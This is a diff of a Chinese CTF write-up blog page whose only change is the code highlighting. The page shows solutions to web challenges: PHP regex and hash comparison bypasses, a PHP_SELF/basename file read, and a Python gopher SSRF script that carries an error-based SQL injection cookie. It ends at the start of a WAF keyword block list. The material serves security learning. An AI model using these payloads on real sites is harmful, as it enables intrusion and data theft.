@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/base16/-gigavolt.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -191,7 +199,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      1.1k 字
+      920 字
     </span>
   
 
@@ -201,7 +209,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      42
+      34
        分钟
     </span>
   
@@ -238,207 +246,207 @@
             <h1 style="display: none">鹤城杯</h1>
             
             <div class="markdown-body">
-              <h2 id="middle-magic"><a href="#middle-magic" class="headerlink" title="middle_magic"></a>middle_magic</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-    highlight_file(<span class="hljs-keyword">__FILE__</span>);
-    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./flag.php&quot;</span>;
-    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./result.php&quot;</span>;
-    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;aaa&#x27;</span>]) &amp;&amp; strlen($_GET[<span class="hljs-string">&#x27;aaa&#x27;</span>]) &lt; <span class="hljs-number">20</span>)&#123;
+              <h2 id="middle-magic"><a href="#middle-magic" class="headerlink" title="middle_magic"></a>middle_magic</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">include</span> <span class="token double-quoted-string string">"./flag.php"</span><span class="token punctuation">;</span>
+    <span class="token keyword">include</span> <span class="token double-quoted-string string">"./result.php"</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'aaa'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'aaa'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
 
-        $aaa = preg_replace(<span class="hljs-string">&#x27;/^(.*)level(.*)$/&#x27;</span>, <span class="hljs-string">&#x27;$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;&#x27;</span>, $_GET[<span class="hljs-string">&#x27;aaa&#x27;</span>]);
+        <span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/^(.*)level(.*)$/'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'$&#123;1&#125;&lt;!-- filtered -->$&#123;2&#125;'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'aaa'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/pass_the_level_1#/&#x27;</span>, $aaa))&#123;
-            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;here is level 2&quot;</span>;
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/pass_the_level_1#/'</span><span class="token punctuation">,</span> <span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"here is level 2"</span><span class="token punctuation">;</span>
             
-            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;admin&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;root_pwd&#x27;</span>])) &#123;
-                <span class="hljs-keyword">if</span> ($_POST[<span class="hljs-string">&#x27;admin&#x27;</span>] == $_POST[<span class="hljs-string">&#x27;root_pwd&#x27;</span>])
-                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;The level 2 can not pass!&lt;/p&gt;&#x27;</span>;
-            <span class="hljs-comment">// START FORM PROCESSING    </span>
-                <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sha1($_POST[<span class="hljs-string">&#x27;admin&#x27;</span>]) === sha1($_POST[<span class="hljs-string">&#x27;root_pwd&#x27;</span>]))&#123;
-                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;here is level 3,do you kown how to overcome it?&quot;</span>;
-                    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;level_3&#x27;</span>])) &#123;
-                        $level_3 = json_decode($_POST[<span class="hljs-string">&#x27;level_3&#x27;</span>]);
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'admin'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'root_pwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'admin'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'root_pwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+                    <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;p>The level 2 can not pass!&lt;/p>'</span><span class="token punctuation">;</span>
+            <span class="token comment">// START FORM PROCESSING    </span>
+                <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'admin'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'root_pwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+                    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"here is level 3,do you kown how to overcome it?"</span><span class="token punctuation">;</span>
+                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'level_3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                        <span class="token variable">$level_3</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'level_3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                         
-                        <span class="hljs-keyword">if</span> ($level_3-&gt;result == $result) &#123;
+                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$level_3</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">result</span> <span class="token operator">==</span> <span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                             
-                            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success:&quot;</span>.$flag;
-                        &#125;
-                        <span class="hljs-keyword">else</span> &#123;
-                            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you never beat me!&quot;</span>;
-                        &#125;
-                    &#125;
-                    <span class="hljs-keyword">else</span>&#123;
-                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;out&quot;</span>;
-                    &#125;
-                &#125;
-                <span class="hljs-keyword">else</span>&#123;
+                            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"success:"</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>
+                        <span class="token punctuation">&#125;</span>
+                        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+                            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"you never beat me!"</span><span class="token punctuation">;</span>
+                        <span class="token punctuation">&#125;</span>
+                    <span class="token punctuation">&#125;</span>
+                    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+                        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"out"</span><span class="token punctuation">;</span>
+                    <span class="token punctuation">&#125;</span>
+                <span class="token punctuation">&#125;</span>
+                <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
                     
-                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no&quot;</span>);
-                &#125;
-            <span class="hljs-comment">// perform validations on the form data</span>
-            &#125;
-            <span class="hljs-keyword">else</span>&#123;
-                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;out!&lt;/p&gt;&#x27;</span>;
-            &#125;
+                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">&#125;</span>
+            <span class="token comment">// perform validations on the form data</span>
+            <span class="token punctuation">&#125;</span>
+            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+                <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;p>out!&lt;/p>'</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
 
-        &#125;
+        <span class="token punctuation">&#125;</span>
         
-        <span class="hljs-keyword">else</span>&#123;
-            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nonono!&#x27;</span>;
-        &#125;
+        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+            <span class="token keyword">echo</span> <span class="token single-quoted-string string">'nonono!'</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
 
-        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;hr&gt;&#x27;</span>;
-    &#125;
+        <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;hr>'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
 
-<span class="hljs-meta">?&gt;</span></code></pre></div>
+<span class="token delimiter important">?></span></span> </code></pre>
 
 <p>payload:</p>
-<div class="hljs"><pre><code>?aaa=%0apass_the_level_1%23
+<pre><code>?aaa=%0apass_the_level_1%23
 
-admin[]=1&amp;root_pwd[]=2&amp;level_3=&#123;&quot;result&quot;:true&#125;</code></pre></div>
-<h2 id="EasyP"><a href="#EasyP" class="headerlink" title="EasyP"></a>EasyP</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-<span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;config.php&#x27;</span>; 
+admin[]=1&amp;root_pwd[]=2&amp;level_3=&#123;&quot;result&quot;:true&#125;</code></pre>
+<h2 id="EasyP"><a href="#EasyP" class="headerlink" title="EasyP"></a>EasyP</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">include</span> <span class="token single-quoted-string string">'config.php'</span><span class="token punctuation">;</span> 
 
-<span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/config\.php\/*$/i&#x27;</span>, $_SERVER[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;
-  <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);
-&#125;
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/config\.php\/*$/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"I don't know what you are thinking, but I won't let you read it :)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
 
-<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;
-  highlight_file(basename($_SERVER[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));
-  <span class="hljs-keyword">exit</span>();
-&#125;
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
 
-$secret = bin2hex(random_bytes(<span class="hljs-number">64</span>));
-<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;guess&#x27;</span>])) &#123;
-  $guess = (<span class="hljs-keyword">string</span>) $_POST[<span class="hljs-string">&#x27;guess&#x27;</span>];
-  <span class="hljs-keyword">if</span> (hash_equals($secret, $guess)) &#123;
-    $message = <span class="hljs-string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;
-  &#125; <span class="hljs-keyword">else</span> &#123;
-    $message = <span class="hljs-string">&#x27;Wrong.&#x27;</span>;
-  &#125;
-&#125;
-<span class="hljs-meta">?&gt;</span>
-&lt;!doctype html&gt;
-&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;
-  &lt;head&gt;
-    &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;
-    &lt;title&gt;Can you guess it?&lt;/title&gt;
-  &lt;/head&gt;
-  &lt;body&gt;
-    &lt;h1&gt;Can you guess it?&lt;/h1&gt;
-    &lt;p&gt;<span class="hljs-keyword">If</span> your guess is correct, I<span class="hljs-string">&#x27;ll give you the flag.&lt;/p&gt;</span>
-<span class="hljs-string">    &lt;p&gt;&lt;a href=&quot;?source&quot;&gt;Source&lt;/a&gt;&lt;/p&gt;</span>
-<span class="hljs-string">    &lt;hr&gt;</span>
-<span class="hljs-string">&lt;?php if (isset($message)) &#123; ?&gt;</span>
-<span class="hljs-string">    &lt;p&gt;&lt;?= $message ?&gt;&lt;/p&gt;</span>
-<span class="hljs-string">&lt;?php &#125; ?&gt;</span>
-<span class="hljs-string">    &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;</span>
-<span class="hljs-string">      &lt;input type=&quot;text&quot; name=&quot;guess&quot;&gt;</span>
-<span class="hljs-string">      &lt;input type=&quot;submit&quot;&gt;</span>
-<span class="hljs-string">    &lt;/form&gt;</span>
-<span class="hljs-string">  &lt;/body&gt;</span>
-<span class="hljs-string">&lt;/html&gt;</span></code></pre></div>
+<span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'guess'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token variable">$guess</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'guess'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">hash_equals</span><span class="token punctuation">(</span><span class="token variable">$secret</span><span class="token punctuation">,</span> <span class="token variable">$guess</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'Congratulations! The flag is: '</span> <span class="token punctuation">.</span> <span class="token constant">FLAG</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'Wrong.'</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Can you guess it?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Can you guess it?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>If your guess is correct, I'll give you the flag.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>?source<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Source<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">></span></span>
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$message</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token delimiter important">?></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span> <span class="token variable">$message</span> <span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token punctuation">&#125;</span> <span class="token delimiter important">?></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>guess<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>
 
 <p>通过<code>highlight_file</code>读取<code>config.php</code><br>但被过了，需要个字符绕过*的匹配</p>
-<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params">$str</span>)</span>&#123;
-    <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">&#x27;/config\.php\/*$/i&#x27;</span>, $str);
-&#125;
-<span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span>; $i &lt; <span class="hljs-number">255</span>; $i++)&#123;
-    $s = <span class="hljs-string">&#x27;/index.php/config.php/&#x27;</span>.chr($i);
-    <span class="hljs-keyword">if</span>(!check($s))&#123;
-        $t = basename(<span class="hljs-string">&#x27;/index.php/config.php/&#x27;</span>.chr($i));
-        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;$&#123;i&#125;: $&#123;t&#125;\n&quot;</span>;
-    &#125;
-&#125;
-<span class="hljs-meta">?&gt;</span></code></pre></div>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">function</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/config\.php\/*$/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">255</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/index.php/config.php/'</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$t</span> <span class="token operator">=</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/index.php/config.php/'</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"$&#123;i&#125;: $&#123;t&#125;\n"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span></code></pre>
 
 <p>payload:<code>/index.php/config.php/%80?source</code></p>
 <h2 id="easy-sql-1"><a href="#easy-sql-1" class="headerlink" title="easy_sql_1"></a>easy_sql_1</h2><p>进去有个<code>use.php</code>,ssrf，但<code>index.php</code>的表单提交不了，没反应</p>
 <p>要用gopher协议打post<br>然后adminadmin登录后发现给了<br><code>cookie:this_is_your_cookie=YWRtaW4=</code>，把cookie带上</p>
 <p>cookie存在sql注入</p>
-<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
-<span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote
 
-data=<span class="hljs-string">&quot;&quot;&quot;POST / HTTP/1.1</span>
-<span class="hljs-string">Host: 127.0.0.1:80</span>
-<span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span>
-<span class="hljs-string">Cookie: this_is_your_cookie=LTEnKXx8dXBkYXRleG1sKDEsY29uY2F0KDEsKHNlbGVjdCBncm91cF9jb25jYXQoZmxhZykgZnJvbSBmbGFnKSwxKSwxKSM=;PHPSESSID=susn9dj4f1806v0pl5oiureek1;</span>
-<span class="hljs-string">Content-Length: &#123;&#125;</span>
-<span class="hljs-string"></span>
-<span class="hljs-string">&#123;&#125;</span>
-<span class="hljs-string">&quot;&quot;&quot;</span>
-payload=<span class="hljs-string">&quot;uname=admin&amp;passwd=admin&quot;</span>
-length=<span class="hljs-built_in">len</span>(payload)
-data=data.<span class="hljs-built_in">format</span>(length,payload)
-data=quote(data,<span class="hljs-string">&#x27;utf-8&#x27;</span>)
-url=<span class="hljs-string">&quot;http://182.116.62.85:28303/use.php&quot;</span>
-params=&#123;
-    <span class="hljs-string">&#x27;url&#x27;</span>:<span class="hljs-string">&quot;gopher://127.0.0.1:80/_&quot;</span>+data
-&#125;
-headers=&#123;
-    <span class="hljs-string">&#x27;Cookie&#x27;</span>:<span class="hljs-string">&quot;PHPSESSID=8t4ppbs8ek3l5v5estgbttqtu3&quot;</span>
-&#125;
+data<span class="token operator">=</span><span class="token triple-quoted-string string">"""POST / HTTP/1.1
+Host: 127.0.0.1:80
+Content-Type: application/x-www-form-urlencoded
+Cookie: this_is_your_cookie=LTEnKXx8dXBkYXRleG1sKDEsY29uY2F0KDEsKHNlbGVjdCBncm91cF9jb25jYXQoZmxhZykgZnJvbSBmbGFnKSwxKSwxKSM=;PHPSESSID=susn9dj4f1806v0pl5oiureek1;
+Content-Length: &#123;&#125;
 
-r=requests.get(url,params=params,headers=headers)
-print(r.text)</code></pre></div>
+&#123;&#125;
+"""</span>
+payload<span class="token operator">=</span><span class="token string">"uname=admin&amp;passwd=admin"</span>
+length<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+data<span class="token operator">=</span>data<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>length<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+data<span class="token operator">=</span>quote<span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
+url<span class="token operator">=</span><span class="token string">"http://182.116.62.85:28303/use.php"</span>
+params<span class="token operator">=</span><span class="token punctuation">&#123;</span>
+    <span class="token string">'url'</span><span class="token punctuation">:</span><span class="token string">"gopher://127.0.0.1:80/_"</span><span class="token operator">+</span>data
+<span class="token punctuation">&#125;</span>
+headers<span class="token operator">=</span><span class="token punctuation">&#123;</span>
+    <span class="token string">'Cookie'</span><span class="token punctuation">:</span><span class="token string">"PHPSESSID=8t4ppbs8ek3l5v5estgbttqtu3"</span>
+<span class="token punctuation">&#125;</span>
+
+r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>params<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre>
 
 <h2 id="easy-sql-2"><a href="#easy-sql-2" class="headerlink" title="easy_sql_2"></a>easy_sql_2</h2><p>WAF:</p>
-<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/select|;|creat|like|insert| |sys|drop|union|file|show|rename|handler|alter|sys|if|prepare|execute|tables|delete|where\./i&quot;</span>, $value))&#123;
